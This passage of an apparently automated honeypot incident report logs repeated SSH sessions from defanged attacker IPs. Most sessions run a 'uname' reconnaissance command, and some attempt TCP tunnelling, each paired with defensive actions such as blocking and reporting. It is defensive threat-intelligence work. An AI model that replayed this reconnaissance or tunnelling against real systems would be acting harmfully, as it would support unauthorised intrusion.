| `2026-09-01 17:27:31` | `cowrie.client.version` |
| `2026-09-01 17:27:31` | `cowrie.client.kex` |
| `2026-09-01 17:27:31` | `cowrie.login.success` |
| `2026-09-01 17:27:32` | `cowrie.session.params` |
| `2026-09-01 17:27:32` | `cowrie.command.input` |
| `2026-09-01 17:27:32` | `cowrie.log.closed` |
| `2026-09-01 17:27:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.68.63[.]15` to AbuseIPDB if not already reported
- [ ] Block `138.68.63[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8ae7aeb44e3

| Field | Detail |
|---|---|
| **Source IP** | `138.68.63[.]15` |
| **First Seen** | 2026-09-01 17:27 |
| **Last Seen** | 2026-09-01 17:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 17:27:51` | `cowrie.session.connect` |
| `2026-09-01 17:27:51` | `cowrie.client.version` |
| `2026-09-01 17:27:51` | `cowrie.client.kex` |
| `2026-09-01 17:27:51` | `cowrie.login.success` |
| `2026-09-01 17:27:52` | `cowrie.session.params` |
| `2026-09-01 17:27:52` | `cowrie.command.input` |
| `2026-09-01 17:27:52` | `cowrie.log.closed` |
| `2026-09-01 17:27:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.68.63[.]15` to AbuseIPDB if not already reported
- [ ] Block `138.68.63[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00b002e628ef

| Field | Detail |
|---|---|
| **Source IP** | `138.68.63[.]15` |
| **First Seen** | 2026-09-01 17:28 |
| **Last Seen** | 2026-09-01 17:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 17:28:12` | `cowrie.session.connect` |
| `2026-09-01 17:28:12` | `cowrie.client.version` |
| `2026-09-01 17:28:12` | `cowrie.client.kex` |
| `2026-09-01 17:28:12` | `cowrie.login.success` |
| `2026-09-01 17:28:12` | `cowrie.session.params` |
| `2026-09-01 17:28:12` | `cowrie.command.input` |
| `2026-09-01 17:28:13` | `cowrie.log.closed` |
| `2026-09-01 17:28:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.68.63[.]15` to AbuseIPDB if not already reported
- [ ] Block `138.68.63[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d924d832a660

| Field | Detail |
|---|---|
| **Source IP** | `138.68.63[.]15` |
| **First Seen** | 2026-09-01 17:28 |
| **Last Seen** | 2026-09-01 17:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 17:28:32` | `cowrie.session.connect` |
| `2026-09-01 17:28:32` | `cowrie.client.version` |
| `2026-09-01 17:28:32` | `cowrie.client.kex` |
| `2026-09-01 17:28:33` | `cowrie.login.success` |
| `2026-09-01 17:28:33` | `cowrie.session.params` |
| `2026-09-01 17:28:33` | `cowrie.command.input` |
| `2026-09-01 17:28:34` | `cowrie.log.closed` |
| `2026-09-01 17:28:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.68.63[.]15` to AbuseIPDB if not already reported
- [ ] Block `138.68.63[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b681c8d0184

| Field | Detail |
|---|---|
| **Source IP** | `138.68.63[.]15` |
| **First Seen** | 2026-09-01 17:28 |
| **Last Seen** | 2026-09-01 17:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 17:28:53` | `cowrie.session.connect` |
| `2026-09-01 17:28:53` | `cowrie.client.version` |
| `2026-09-01 17:28:53` | `cowrie.client.kex` |
| `2026-09-01 17:28:54` | `cowrie.login.success` |
| `2026-09-01 17:28:54` | `cowrie.session.params` |
| `2026-09-01 17:28:54` | `cowrie.command.input` |
| `2026-09-01 17:28:54` | `cowrie.log.closed` |
| `2026-09-01 17:28:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.68.63[.]15` to AbuseIPDB if not already reported
- [ ] Block `138.68.63[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a83fc315af2c

| Field | Detail |
|---|---|
| **Source IP** | `138.68.63[.]15` |
| **First Seen** | 2026-09-01 17:29 |
| **Last Seen** | 2026-09-01 17:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 17:29:15` | `cowrie.session.connect` |
| `2026-09-01 17:29:15` | `cowrie.client.version` |
| `2026-09-01 17:29:15` | `cowrie.client.kex` |
| `2026-09-01 17:29:15` | `cowrie.login.success` |
| `2026-09-01 17:29:16` | `cowrie.session.params` |
| `2026-09-01 17:29:16` | `cowrie.command.input` |
| `2026-09-01 17:29:16` | `cowrie.log.closed` |
| `2026-09-01 17:29:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.68.63[.]15` to AbuseIPDB if not already reported
- [ ] Block `138.68.63[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dbc9b4a4f415

| Field | Detail |
|---|---|
| **Source IP** | `138.68.63[.]15` |
| **First Seen** | 2026-09-01 17:29 |
| **Last Seen** | 2026-09-01 17:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 17:29:36` | `cowrie.session.connect` |
| `2026-09-01 17:29:36` | `cowrie.client.version` |
| `2026-09-01 17:29:36` | `cowrie.client.kex` |
| `2026-09-01 17:29:36` | `cowrie.login.success` |
| `2026-09-01 17:29:37` | `cowrie.session.params` |
| `2026-09-01 17:29:37` | `cowrie.command.input` |
| `2026-09-01 17:29:37` | `cowrie.log.closed` |
| `2026-09-01 17:29:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.68.63[.]15` to AbuseIPDB if not already reported
- [ ] Block `138.68.63[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2560b23813c

| Field | Detail |
|---|---|
| **Source IP** | `138.68.63[.]15` |
| **First Seen** | 2026-09-01 17:29 |
| **Last Seen** | 2026-09-01 17:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 17:29:55` | `cowrie.session.connect` |
| `2026-09-01 17:29:55` | `cowrie.client.version` |
| `2026-09-01 17:29:55` | `cowrie.client.kex` |
| `2026-09-01 17:29:56` | `cowrie.login.success` |
| `2026-09-01 17:29:57` | `cowrie.session.params` |
| `2026-09-01 17:29:57` | `cowrie.command.input` |
| `2026-09-01 17:29:57` | `cowrie.log.closed` |
| `2026-09-01 17:29:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.68.63[.]15` to AbuseIPDB if not already reported
- [ ] Block `138.68.63[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92a77bd7b014

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 17:30 |
| **Last Seen** | 2026-09-01 17:30 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 17:30:11` | `cowrie.session.connect` |
| `2026-09-01 17:30:11` | `cowrie.client.version` |
| `2026-09-01 17:30:12` | `cowrie.client.kex` |
| `2026-09-01 17:30:13` | `cowrie.login.success` |
| `2026-09-01 17:30:13` | `cowrie.direct-tcpip.request` |
| `2026-09-01 17:30:13` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 17:30:13` | `cowrie.direct-tcpip.data` |
| `2026-09-01 17:30:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17ddc07b0d08

| Field | Detail |
|---|---|
| **Source IP** | `138.68.63[.]15` |
| **First Seen** | 2026-09-01 17:30 |
| **Last Seen** | 2026-09-01 17:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 17:30:12` | `cowrie.session.connect` |
| `2026-09-01 17:30:12` | `cowrie.client.version` |
| `2026-09-01 17:30:12` | `cowrie.client.kex` |
| `2026-09-01 17:30:12` | `cowrie.login.success` |
| `2026-09-01 17:30:13` | `cowrie.session.params` |
| `2026-09-01 17:30:13` | `cowrie.command.input` |
| `2026-09-01 17:30:13` | `cowrie.log.closed` |
| `2026-09-01 17:30:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.68.63[.]15` to AbuseIPDB if not already reported
- [ ] Block `138.68.63[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9e28949dcd3

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 17:30 |
| **Last Seen** | 2026-09-01 17:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 17:30:19` | `cowrie.session.connect` |
| `2026-09-01 17:30:19` | `cowrie.client.version` |
| `2026-09-01 17:30:19` | `cowrie.client.kex` |
| `2026-09-01 17:30:20` | `cowrie.login.success` |
| `2026-09-01 17:30:20` | `cowrie.direct-tcpip.request` |
| `2026-09-01 17:30:21` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 17:30:21` | `cowrie.direct-tcpip.data` |
| `2026-09-01 17:30:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5f674353a1c

| Field | Detail |
|---|---|
| **Source IP** | `138.68.63[.]15` |
| **First Seen** | 2026-09-01 17:30 |
| **Last Seen** | 2026-09-01 17:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 17:30:33` | `cowrie.session.connect` |
| `2026-09-01 17:30:33` | `cowrie.client.version` |
| `2026-09-01 17:30:33` | `cowrie.client.kex` |
| `2026-09-01 17:30:33` | `cowrie.login.success` |
| `2026-09-01 17:30:34` | `cowrie.session.params` |
| `2026-09-01 17:30:34` | `cowrie.command.input` |
| `2026-09-01 17:30:34` | `cowrie.log.closed` |
| `2026-09-01 17:30:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.68.63[.]15` to AbuseIPDB if not already reported
- [ ] Block `138.68.63[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bae891448be8

| Field | Detail |
|---|---|
| **Source IP** | `138.68.63[.]15` |
| **First Seen** | 2026-09-01 17:30 |
| **Last Seen** | 2026-09-01 17:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 17:30:54` | `cowrie.session.connect` |
| `2026-09-01 17:30:54` | `cowrie.client.version` |
| `2026-09-01 17:30:54` | `cowrie.client.kex` |
| `2026-09-01 17:30:54` | `cowrie.login.success` |
| `2026-09-01 17:30:55` | `cowrie.session.params` |
| `2026-09-01 17:30:55` | `cowrie.command.input` |
| `2026-09-01 17:30:56` | `cowrie.log.closed` |
| `2026-09-01 17:30:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.68.63[.]15` to AbuseIPDB if not already reported
- [ ] Block `138.68.63[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84557e31cc8f

| Field | Detail |
|---|---|
| **Source IP** | `138.68.63[.]15` |
| **First Seen** | 2026-09-01 17:31 |
| **Last Seen** | 2026-09-01 17:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 17:31:14` | `cowrie.session.connect` |
| `2026-09-01 17:31:14` | `cowrie.client.version` |
| `2026-09-01 17:31:15` | `cowrie.client.kex` |
| `2026-09-01 17:31:15` | `cowrie.login.success` |
| `2026-09-01 17:31:15` | `cowrie.session.params` |
| `2026-09-01 17:31:15` | `cowrie.command.input` |
| `2026-09-01 17:31:15` | `cowrie.log.closed` |
| `2026-09-01 17:31:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.68.63[.]15` to AbuseIPDB if not already reported
- [ ] Block `138.68.63[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7b9d0fb0fe7

| Field | Detail |
|---|---|
| **Source IP** | `138.68.63[.]15` |
| **First Seen** | 2026-09-01 17:31 |
| **Last Seen** | 2026-09-01 17:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 17:31:36` | `cowrie.session.connect` |
| `2026-09-01 17:31:36` | `cowrie.client.version` |
| `2026-09-01 17:31:36` | `cowrie.client.kex` |
| `2026-09-01 17:31:36` | `cowrie.login.success` |
| `2026-09-01 17:31:37` | `cowrie.session.params` |
| `2026-09-01 17:31:37` | `cowrie.command.input` |
| `2026-09-01 17:31:37` | `cowrie.log.closed` |
| `2026-09-01 17:31:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.68.63[.]15` to AbuseIPDB if not already reported
- [ ] Block `138.68.63[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8cdedf1cfe71

| Field | Detail |
|---|---|
| **Source IP** | `138.68.63[.]15` |
| **First Seen** | 2026-09-01 17:31 |
| **Last Seen** | 2026-09-01 17:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 17:31:57` | `cowrie.session.connect` |
| `2026-09-01 17:31:57` | `cowrie.client.version` |
| `2026-09-01 17:31:57` | `cowrie.client.kex` |
| `2026-09-01 17:31:57` | `cowrie.login.success` |
| `2026-09-01 17:31:58` | `cowrie.session.params` |
| `2026-09-01 17:31:58` | `cowrie.command.input` |
| `2026-09-01 17:31:58` | `cowrie.log.closed` |
| `2026-09-01 17:31:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.68.63[.]15` to AbuseIPDB if not already reported
- [ ] Block `138.68.63[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f821f5cd8c02

| Field | Detail |
|---|---|
| **Source IP** | `138.68.63[.]15` |
| **First Seen** | 2026-09-01 17:32 |
| **Last Seen** | 2026-09-01 17:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 17:32:18` | `cowrie.session.connect` |
| `2026-09-01 17:32:18` | `cowrie.client.version` |
| `2026-09-01 17:32:18` | `cowrie.client.kex` |
| `2026-09-01 17:32:18` | `cowrie.login.success` |
| `2026-09-01 17:32:19` | `cowrie.session.params` |
| `2026-09-01 17:32:19` | `cowrie.command.input` |
| `2026-09-01 17:32:19` | `cowrie.log.closed` |
| `2026-09-01 17:32:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.68.63[.]15` to AbuseIPDB if not already reported
- [ ] Block `138.68.63[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d809d64c5886

| Field | Detail |
|---|---|
| **Source IP** | `138.68.63[.]15` |
| **First Seen** | 2026-09-01 17:32 |
| **Last Seen** | 2026-09-01 17:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 17:32:39` | `cowrie.session.connect` |
| `2026-09-01 17:32:39` | `cowrie.client.version` |
| `2026-09-01 17:32:39` | `cowrie.client.kex` |
| `2026-09-01 17:32:40` | `cowrie.login.success` |
| `2026-09-01 17:32:40` | `cowrie.session.params` |
| `2026-09-01 17:32:40` | `cowrie.command.input` |
| `2026-09-01 17:32:40` | `cowrie.log.closed` |
| `2026-09-01 17:32:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.68.63[.]15` to AbuseIPDB if not already reported
- [ ] Block `138.68.63[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12a5b45b6289

| Field | Detail |
|---|---|
| **Source IP** | `138.68.63[.]15` |
| **First Seen** | 2026-09-01 17:33 |
| **Last Seen** | 2026-09-01 17:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 17:33:01` | `cowrie.session.connect` |
| `2026-09-01 17:33:01` | `cowrie.client.version` |
| `2026-09-01 17:33:02` | `cowrie.client.kex` |
| `2026-09-01 17:33:02` | `cowrie.login.success` |
| `2026-09-01 17:33:02` | `cowrie.session.params` |
| `2026-09-01 17:33:02` | `cowrie.command.input` |
| `2026-09-01 17:33:02` | `cowrie.log.closed` |
| `2026-09-01 17:33:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.68.63[.]15` to AbuseIPDB if not already reported
- [ ] Block `138.68.63[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75053b79a478

| Field | Detail |
|---|---|
| **Source IP** | `138.68.63[.]15` |
| **First Seen** | 2026-09-01 17:33 |
| **Last Seen** | 2026-09-01 17:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 17:33:24` | `cowrie.session.connect` |
| `2026-09-01 17:33:24` | `cowrie.client.version` |
| `2026-09-01 17:33:24` | `cowrie.client.kex` |
| `2026-09-01 17:33:24` | `cowrie.login.success` |
| `2026-09-01 17:33:25` | `cowrie.session.params` |
| `2026-09-01 17:33:25` | `cowrie.command.input` |
| `2026-09-01 17:33:25` | `cowrie.log.closed` |
| `2026-09-01 17:33:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.68.63[.]15` to AbuseIPDB if not already reported
- [ ] Block `138.68.63[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0f6b734e27b

| Field | Detail |
|---|---|
| **Source IP** | `138.68.63[.]15` |
| **First Seen** | 2026-09-01 17:33 |
| **Last Seen** | 2026-09-01 17:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 17:33:45` | `cowrie.session.connect` |
| `2026-09-01 17:33:45` | `cowrie.client.version` |
| `2026-09-01 17:33:45` | `cowrie.client.kex` |
| `2026-09-01 17:33:45` | `cowrie.login.success` |
| `2026-09-01 17:33:46` | `cowrie.session.params` |
| `2026-09-01 17:33:46` | `cowrie.command.input` |
| `2026-09-01 17:33:46` | `cowrie.log.closed` |
| `2026-09-01 17:33:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.68.63[.]15` to AbuseIPDB if not already reported
- [ ] Block `138.68.63[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a1094a6133a

| Field | Detail |
|---|---|
| **Source IP** | `138.68.63[.]15` |
| **First Seen** | 2026-09-01 17:34 |
| **Last Seen** | 2026-09-01 17:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 17:34:07` | `cowrie.session.connect` |
| `2026-09-01 17:34:07` | `cowrie.client.version` |
| `2026-09-01 17:34:07` | `cowrie.client.kex` |
| `2026-09-01 17:34:08` | `cowrie.login.success` |
| `2026-09-01 17:34:08` | `cowrie.session.params` |
| `2026-09-01 17:34:08` | `cowrie.command.input` |
| `2026-09-01 17:34:09` | `cowrie.log.closed` |
| `2026-09-01 17:34:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.68.63[.]15` to AbuseIPDB if not already reported
- [ ] Block `138.68.63[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb7da6fd41bc

| Field | Detail |
|---|---|
| **Source IP** | `138.68.63[.]15` |
| **First Seen** | 2026-09-01 17:34 |
| **Last Seen** | 2026-09-01 17:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 17:34:29` | `cowrie.session.connect` |
| `2026-09-01 17:34:29` | `cowrie.client.version` |
| `2026-09-01 17:34:29` | `cowrie.client.kex` |
| `2026-09-01 17:34:29` | `cowrie.login.success` |
| `2026-09-01 17:34:30` | `cowrie.session.params` |
| `2026-09-01 17:34:30` | `cowrie.command.input` |
| `2026-09-01 17:34:30` | `cowrie.log.closed` |
| `2026-09-01 17:34:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.68.63[.]15` to AbuseIPDB if not already reported
- [ ] Block `138.68.63[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b6b471a12cd

| Field | Detail |
|---|---|
| **Source IP** | `138.68.63[.]15` |
| **First Seen** | 2026-09-01 17:34 |
| **Last Seen** | 2026-09-01 17:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 17:34:51` | `cowrie.session.connect` |
| `2026-09-01 17:34:51` | `cowrie.client.version` |
| `2026-09-01 17:34:51` | `cowrie.client.kex` |
| `2026-09-01 17:34:52` | `cowrie.login.success` |
| `2026-09-01 17:34:52` | `cowrie.session.params` |
| `2026-09-01 17:34:52` | `cowrie.command.input` |
| `2026-09-01 17:34:52` | `cowrie.log.closed` |
| `2026-09-01 17:34:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.68.63[.]15` to AbuseIPDB if not already reported
- [ ] Block `138.68.63[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4d14eae044b

| Field | Detail |
|---|---|
| **Source IP** | `138.68.63[.]15` |
| **First Seen** | 2026-09-01 17:35 |
| **Last Seen** | 2026-09-01 17:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 17:35:14` | `cowrie.session.connect` |
| `2026-09-01 17:35:14` | `cowrie.client.version` |
| `2026-09-01 17:35:14` | `cowrie.client.kex` |
| `2026-09-01 17:35:14` | `cowrie.login.success` |
| `2026-09-01 17:35:15` | `cowrie.session.params` |
| `2026-09-01 17:35:15` | `cowrie.command.input` |
| `2026-09-01 17:35:15` | `cowrie.log.closed` |
| `2026-09-01 17:35:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.68.63[.]15` to AbuseIPDB if not already reported
- [ ] Block `138.68.63[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d453d7d94d74

| Field | Detail |
|---|---|
| **Source IP** | `138.68.63[.]15` |
| **First Seen** | 2026-09-01 17:35 |
| **Last Seen** | 2026-09-01 17:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 17:35:36` | `cowrie.session.connect` |
| `2026-09-01 17:35:36` | `cowrie.client.version` |
| `2026-09-01 17:35:36` | `cowrie.client.kex` |
| `2026-09-01 17:35:36` | `cowrie.login.success` |
| `2026-09-01 17:35:37` | `cowrie.session.params` |
